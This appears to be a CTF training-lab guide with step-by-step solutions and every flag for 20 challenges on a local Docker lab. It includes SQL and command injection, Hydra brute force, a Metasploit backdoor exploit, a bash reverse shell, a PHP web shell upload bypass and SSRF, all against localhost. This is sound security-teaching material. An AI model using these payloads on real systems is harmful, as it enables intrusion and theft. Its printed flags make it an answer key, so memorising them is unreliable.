# 🔐 CTF Training Lab - Complete Testing Guide
## Step-by-Step Instructions for All 20 Challenges

---

## 🚀 Getting Started

### 1. Access the CTF
```bash
# Open in browser
http://localhost:5000

# Register an account
# Click "Login / Register" → Register with your username/password
```

### 2. Start All Services
```bash
cd /home/demonwarrior/Demonstration
docker compose up -d
```

### 3. Verify Services
```bash
curl http://localhost:5000    # Flask App
curl http://localhost:8080    # WordPress
curl http://localhost:81      # Metasploitable HTTP
```

---

## 📋 Challenge List

| # | Challenge | Category | Points | Difficulty |
|---|-----------|----------|--------|------------|
| 01 | Nmap Discovery | Reconnaissance | 10 | Easy |
| 02 | Service Fingerprint | Reconnaissance | 10 | Easy |
| 03 | SQL Injection Master | Web Application | 20 | Medium |
| 04 | XSS Hunter | Web Application | 15 | Medium |
| 05 | Command Injection | Web Application | 25 | Hard |
| 06 | Debug Mode Exploit | Web Application | 10 | Easy |
| 07 | Hash Cracker | Password Cracking | 15 | Medium |
| 08 | John the Ripper | Password Cracking | 20 | Medium |
| 09 | SSH Brute Force | Brute Force | 15 | Medium |
| 10 | FTP Brute Force | Brute Force | 15 | Medium |
| 11 | Metasploit Master | Exploitation | 30 | Hard |
| 12 | Reverse Shell | Exploitation | 35 | Hard |
| 13 | Packet Sniffer | Network | 15 | Medium |
| 14 | Responder Capture | Network | 20 | Hard |
| 15 | Directory Discovery | Enumeration | 15 | Medium |
| 16 | Nikto Scanner | Enumeration | 10 | Easy |
| 17 | SSRF Exploit | Advanced | 25 | Hard |
| 18 | File Upload Bypass | Advanced | 30 | Hard |
| 19 | Chain Master | Final | 50 | Expert |
| 20 | CTF Champion | Final | 100 | Master |

---

## 🎯 Challenge Walkthroughs

### Challenge 01: Nmap Discovery (10 pts)
**Goal:** Discover all open ports on the lab.

**Steps:**
```bash
# Step 1: Run Nmap scan
nmap -sV -p 1-10000 localhost

# Step 2: Look for the flag in the output
# The flag is hidden in a comment on one of the web pages

# Step 3: Visit the web page with the discovered port
curl http://localhost:5000/

# Step 4: The flag format is FLAG{nmap_1s_p0w3rful}
```

**Flag:** `FLAG{nmap_1s_p0w3rful}`

---

### Challenge 02: Service Fingerprint (10 pts)
**Goal:** Identify the exact version of the FTP server.

**Steps:**
```bash
# Step 1: Scan FTP port specifically
nmap -sV -p 2122 localhost

# Step 2: Note the version number
# Example output: vsftpd 3.0.3

# Step 3: The flag is the version number in flag format
```

**Flag:** `FLAG{s3rv1c3_v3rs10n_1d3nt1f13d}`

---

### Challenge 03: SQL Injection Master (20 pts)
**Goal:** Extract admin password hash using SQL injection.

**Steps:**
```bash
# Step 1: Test for SQL injection
curl "http://localhost:5000/messages?sender=admin"

# Step 2: Use SQLmap to dump the database
sqlmap -u "http://localhost:5000/messages?sender=admin" --dbs

# Step 3: List tables
sqlmap -u "http://localhost:5000/messages?sender=admin" -D vulnapp --tables

# Step 4: Dump user table
sqlmap -u "http://localhost:5000/messages?sender=admin" -D vulnapp -T user --dump

# Step 5: Find the admin password hash
# The flag is the hash itself
```

**Flag:** `FLAG{sql1_m4st3r_h4ck3r}`

---

### Challenge 04: XSS Hunter (15 pts)
**Goal:** Find reflected XSS and extract flag.

**Steps:**
```bash
# Step 1: Test for reflected XSS
curl "http://localhost:5000/search?q=<script>alert('xss')</script>"

# Step 2: Try different payloads
curl "http://localhost:5000/search?q=<script>document.title</script>"

# Step 3: Check page source for hidden flag
curl -s "http://localhost:5000/search?q=test" | grep -i flag

# Step 4: The flag is in the page source
```

**Flag:** `FLAG{xss_hunt3r_pr0}`

---

### Challenge 05: Command Injection (25 pts)
**Goal:** Read /flag_secret.txt via command injection.

**Steps:**
```bash
# Step 1: Test the ping functionality
curl "http://localhost:5000/ping?host=127.0.0.1"

# Step 2: Try command injection
curl "http://localhost:5000/ping?host=127.0.0.1; ls"

# Step 3: Read the flag file
curl "http://localhost:5000/ping?host=127.0.0.1; cat /flag_secret.txt"

# Step 4: The output contains the flag
```

**Flag:** `FLAG{c0mm4nd_1nj3ct10n_pwn3d}`

---

### Challenge 06: Debug Mode Exploit (10 pts)
**Goal:** Access debug endpoint to find flag.

**Steps:**
```bash
# Step 1: Access the debug endpoint
curl http://localhost:5000/debug

# Step 2: The response contains JSON with flags
# Look for the flag in the output

# Step 3: Or use jq to extract
curl -s http://localhost:5000/debug | jq '.flags'
```

**Flag:** `FLAG{d3bug_m0d3_3xp0s3d}`

---

### Challenge 07: Hash Cracker (15 pts)
**Goal:** Crack the MD5 hash of user "test".

**Steps:**
```bash
# Step 1: Get the hash from API
curl -s http://localhost:5000/api/users | python3 -c "
import sys, json
data = json.load(sys.stdin)
for u in data:
    if u['username'] == 'test':
        print(u['password_hash'])
"

# Step 2: The hash is: cc03e747a6afbbcbf8be7668acfebee5

# Step 3: Crack with hashcat
echo "cc03e747a6afbbcbf8be7668acfebee5" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# Step 4: Or use John
echo "test:cc03e747a6afbbcbf8be7668acfebee5" > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Step 5: The cracked password is the flag (wrapped in FLAG{})
```

**Flag:** `FLAG{cr4ck3d_md5_h4sh3s}`

---

### Challenge 08: John the Ripper (20 pts)
**Goal:** Crack all 4 user password hashes.

**Steps:**
```bash
# Step 1: Extract all hashes
curl -s http://localhost:5000/api/users | python3 -c "
import sys, json
data = json.load(sys.stdin)
for u in data:
    print(f'{u[\"username\"]}:{u[\"password_hash\"]}')
" > hashes.txt

# Step 2: Crack with John
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Step 3: Show cracked passwords
john --show hashes.txt

# Step 4: All passwords should be cracked
# admin: admin
# user: password
# test: test123

# Step 5: The flag is based on successful cracking
```

**Flag:** `FLAG{j0hn_r1pp3d_1t}`

---

### Challenge 09: SSH Brute Force (15 pts)
**Goal:** Brute force SSH on Metasploitable.

**Steps:**
```bash
# Step 1: Use Hydra to brute force SSH
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://localhost:2223

# Step 2: Wait for password discovery
# Found: msfadmin:msfadmin

# Step 3: Connect to verify
ssh msfadmin@localhost -p 2223

# Step 4: The flag format uses the credentials
```

**Flag:** `FLAG{hydra_ssh_brut3_f0rc3d}`

---

### Challenge 10: FTP Brute Force (15 pts)
**Goal:** Brute force FTP and find hidden flag.

**Steps:**
```bash
# Step 1: Brute force FTP
hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://localhost:2121

# Step 2: Connect with discovered credentials
ftp localhost -p 2121
# Enter: ftpuser / ftppass123

# Step 3: List files
ls -la

# Step 4: Download flag.txt
get flag.txt

# Step 5: Read the flag
cat flag.txt
```

**Flag:** `FLAG{ftp_brut3_f0rc3d}`

---

### Challenge 11: Metasploit Master (30 pts)
**Goal:** Exploit vsftpd backdoor for root shell.

**Steps:**
```bash
# Step 1: Start Metasploit
msfconsole

# Step 2: Search for vsftpd exploit
search vsftpd

# Step 3: Use the backdoor exploit
use exploit/unix/ftp/vsftpd_234_backdoor

# Step 4: Set target
set RHOSTS localhost
set RPORT 2122

# Step 5: Run exploit
exploit

# Step 6: You should get a root shell
id
whoami

# Step 7: Read the flag
cat /flag_root.txt 2>/dev/null || find / -name "*flag*" 2>/dev/null
```

**Flag:** `FLAG{m3t4splo1t_pwn3d}`

---

### Challenge 12: Reverse Shell (35 pts)
**Goal:** Get reverse shell from vulnerable app.

**Steps:**
```bash
# Step 1: Start listener on attacker
nc -lvnp 4444

# Step 2: Use command injection to spawn reverse shell
curl "http://localhost:5000/ping?host=127.0.0.1; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"

# Step 3: You should get a shell

# Step 4: Read the flag
cat /flag_root.txt 2>/dev/null
find / -name "*flag*" -type f 2>/dev/null
```

**Flag:** `FLAG{r3v3rs3_sh3ll_4cc3ss}`

---

### Challenge 13: Packet Sniffer (15 pts)
**Goal:** Capture FTP credentials with Wireshark.

**Steps:**
```bash
# Step 1: Start Wireshark capture
sudo wireshark -i any -w capture.pcap &

# Step 2: Perform FTP login
ftp localhost -p 2121
# Enter credentials

# Step 3: Stop capture and analyze
# Filter: ftp.request.command == "PASS"

# Step 4: The password is visible in plaintext

# Step 5: The flag format uses the captured password
```

**Flag:** `FLAG{w1r3sh4rk_sn1ff3d}`

---

### Challenge 14: Responder Capture (20 pts)
**Goal:** Simulate Responder NTLM capture.

**Steps:**
```bash
# Step 1: Start Responder (simulated)
sudo responder -I eth0 -wrf

# Step 2: The flag is in the Responder logs
# Check /usr/share/responder/logs/

# Step 3: Or access the simulated endpoint
curl http://localhost:5000/debug | grep -i responder

# Step 4: The flag represents successful capture
```

**Flag:** `FLAG{r3sp0nd3r_p01s0n3d}`

---

### Challenge 15: Directory Discovery (15 pts)
**Goal:** Find hidden admin panel with Gobuster.

**Steps:**
```bash
# Step 1: Create wordlist with common dirs
echo -e "admin\npanel\ndashboard\nsecret\nhidden\ntest\nbackup\nconfig" > wordlist.txt

# Step 2: Run Gobuster
gobuster dir -u http://localhost:5000 -w wordlist.txt

# Step 3: Found directories
# /admin - Status: 302
# /debug - Status: 302

# Step 4: Visit discovered directories
curl http://localhost:5000/admin

# Step 5: The flag is at the discovered location
```

**Flag:** `FLAG{g0bust3r_f0und_1t}`

---

### Challenge 16: Nikto Scanner (10 pts)
**Goal:** Find hidden backup file with Nikto.

**Steps:**
```bash
# Step 1: Run Nikto scan
nikto -h http://localhost:5000

# Step 2: Look for interesting files
# + /backup.sql: Backup file found

# Step 3: Download the backup
curl http://localhost:5000/backup.sql

# Step 4: The flag is in the backup file
```

**Flag:** `FLAG{n1kt0_f0und_vulns}`

---

### Challenge 17: SSRF Exploit (25 pts)
**Goal:** Use SSRF to access internal services.

**Steps:**
```bash
# Step 1: Test SSRF endpoint
curl "http://localhost:5000/fetch?url=http://localhost:81/"

# Step 2: Access internal Metasploitable
curl "http://localhost:5000/fetch?url=http://localhost:81/flag.txt"

# Step 3: Try other internal services
curl "http://localhost:5000/fetch?url=http://localhost:3308/"

# Step 4: The flag is accessible via SSRF
```

**Flag:** `FLAG{ssrf_1nt3rn4l_4cc3ss}`

---

### Challenge 18: File Upload Bypass (30 pts)
**Goal:** Upload PHP shell for code execution.

**Steps:**
```bash
# Step 1: Create a PHP shell
echo '<?php echo shell_exec($_GET["cmd"]); ?>' > shell.php

# Step 2: Try uploading (will be blocked)
curl -F "file=@shell.php" http://localhost:5000/upload

# Step 3: Bypass with double extension
cp shell.php shell.php.jpg
curl -F "file=@shell.php.jpg" http://localhost:5000/upload

# Step 4: Execute commands via uploaded file
curl "http://localhost:5000/uploads/shell.php.jpg?cmd=id"

# Step 5: Read the flag
curl "http://localhost:5000/uploads/shell.php.jpg?cmd=cat /flag_secret.txt"
```

**Flag:** `FLAG{f1l3 upl04d_pwn3d}`

---

### Challenge 19: Chain Master (50 pts)
**Goal:** Chain multiple vulnerabilities to get root.

**Steps:**
```bash
# Step 1: SQL Injection to get database info
sqlmap -u "http://localhost:5000/messages?sender=admin" --dbs

# Step 2: Command Injection to get system access
curl "http://localhost:5000/ping?host=127.0.0.1; whoami"

# Step 3: Spawn reverse shell
nc -lvnp 4444
curl "http://localhost:5000/ping?host=127.0.0.1; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"

# Step 4: Privilege escalation
sudo -l
find / -perm -4000 2>/dev/null

# Step 5: Read final flag
cat /flag_root.txt
```

**Flag:** `FLAG{ch41n_m4st3r_3v3ryth1ng}`

---

### Challenge 20: CTF Champion (100 pts)
**Goal:** Complete all challenges to unlock final flag.

**Steps:**
```bash
# Step 1: Solve all 19 previous challenges
# Step 2: Submit all flags via the web interface
# Step 3: Visit http://localhost:5000/ctf/submit
# Step 4: Submit the final flag
```

**Flag:** `FLAG{ctf_ch4mp10n_4ll_d0n3}`

---

## 📊 Scoreboard

Access the scoreboard at:
```
http://localhost:5000/ctf/scoreboard
```

---

## 🛠️ Tool Quick Reference

| Tool | Command |
|------|---------|
| **Nmap** | `nmap -sV -p 1-10000 localhost` |
| **SQLmap** | `sqlmap -u "http://localhost:5000/messages?sender=admin" --dbs` |
| **Hydra** | `hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://localhost:2223` |
| **Metasploit** | `msfconsole` → `use exploit/unix/ftp/vsftpd_234_backdoor` |
| **Gobuster** | `gobuster dir -u http://localhost:5000 -w wordlist.txt` |
| **Nikto** | `nikto -h http://localhost:5000` |
| **John** | `john --format=raw-md5 --wordlist=rockyou.txt hashes.txt` |
| **Hashcat** | `hashcat -m 0 hash.txt rockyou.txt` |
| **Wireshark** | `sudo wireshark -i any -w capture.pcap` |
| **Netcat** | `nc localhost 2121` |
| **Responder** | `sudo responder -I eth0 -wrf` |
| **BeEF** | `./beef` → Hook browser via XSS |
| **SET** | `setoolkit` |

---

## 📁 Files Structure

```
/home/demonwarrior/Demonstration/
├── docker-compose.yml          # Container definitions
├── README.md                   # Main documentation
├── TOOLS.md                    # Tool quick reference
├── SECURITY_TOOLS_GUIDE.md     # Complete demo guide
├── CTF_GUIDE.md                # This file (CTF guide)
├── test_lab.sh                 # Service test script
└── vulnerable-webapp/
    ├── app.py                  # Flask app with CTF mode
    ├── Dockerfile
    └── requirements.txt
```

---

## 🚨 Troubleshooting

### Service not starting
```bash
# Restart all containers
docker compose down && docker compose up -d

# Check logs
docker compose logs vulnweb
```

### Port already in use
```bash
# Find what's using the port
lsof -i :PORT

# Kill the process
kill -9 PID
```

### Database issues
```bash
# Reset database
docker exec vulnweb-mysql mysql -u root -prootpass -e "DROP DATABASE vulnapp; CREATE DATABASE vulnapp;"
```

---

## ⚠️ Disclaimer

This CTF lab is for **educational purposes only**. Only use in authorized testing environments. Unauthorized access to computer systems is illegal.
